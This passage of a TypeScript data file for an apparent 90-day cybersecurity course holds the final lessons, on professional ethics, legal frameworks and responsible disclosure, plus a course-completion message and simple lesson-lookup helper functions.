    estimatedMinutes: 60,
  },
  {
    id: 89, day: 89, title: "Ethics & Legal Framework", category: "Career", categoryColor: "#00FF00",
    theory: "Cybersecurity professionals must operate within legal and ethical boundaries.\n\nLegal Framework:\n- Computer Fraud and Abuse Act (CFAA) — US\n- Computer Misuse Act — UK\n- GDPR — EU data protection\n- Always have WRITTEN AUTHORIZATION before testing\n\nEthical Hacker Code:\n- Do no harm\n- Stay within scope\n- Report all findings\n- Protect client confidentiality\n- Don't access data you don't need\n\nBug Bounty Ethics:\n- Read program scope carefully\n- No DoS attacks\n- No social engineering of employees\n- Report promptly and responsibly\n\nResponsible Disclosure:\n- Notify vendor with details\n- Allow 90 days for patch (Google Project Zero standard)\n- Coordinate public disclosure\n\nProfessional Organizations:\n- (ISC)² Code of Ethics\n- EC-Council Code of Ethics",
    tasks: ["Read the (ISC)² Code of Ethics completely", "Research 3 cases where ethical hackers faced legal trouble", "Write your personal cybersecurity ethics policy", "Research: What is responsible disclosure and why does it matter?"],
    resources: ["https://www.isc2.org/Ethics", "https://www.cisa.gov/"],
    estimatedMinutes: 45,
  },
  {
    id: 90, day: 90, title: "Day 90 — Journey Complete!", category: "Career", categoryColor: "#00FF00",
    theory: "CONGRATULATIONS! You have completed the 90 Days of Cybersecurity Challenge!\n\n🔐 What you've mastered:\n\n✓ Networking (Days 1-14)\n✓ Linux (Days 15-28)\n✓ Python for Security (Days 29-42)\n✓ Web Security (Days 43-56)\n✓ Penetration Testing (Days 57-70)\n✓ Forensics & Advanced Topics (Days 71-84)\n✓ Career Development (Days 85-90)\n\nYou now have the foundation of a comprehensive cybersecurity skill set. But remember — cybersecurity is a journey, not a destination.\n\nNext Steps:\n→ Choose your specialization\n→ Get certified (OSCP, CISSP, etc.)\n→ Build your portfolio\n→ Join the community\n→ Keep practicing and learning\n→ Give back and mentor others",
    tasks: ["Celebrate — you completed 90 days of cybersecurity learning!", "Write a reflection on what you've learned and how you've grown", "Define your next 90-day goal and specialization path", "Share your achievement and inspire others to start their journey"],
    resources: ["https://www.hackthebox.com/", "https://tryhackme.com/", "https://www.offensive-security.com/"],
    estimatedMinutes: 60,
  },
];

export function getLessonsByModule(moduleId: string): Lesson[] {
  const module = MODULES.find((m) => m.id === moduleId);
  if (!module) return [];
  return LESSONS.filter((l) => module.days.includes(l.day));
}

export function getLessonByDay(day: number): Lesson | undefined {
  return LESSONS.find((l) => l.day === day);
}

export function getModuleForDay(day: number): Module | undefined {
  return MODULES.find((m) => m.days.includes(day));
}

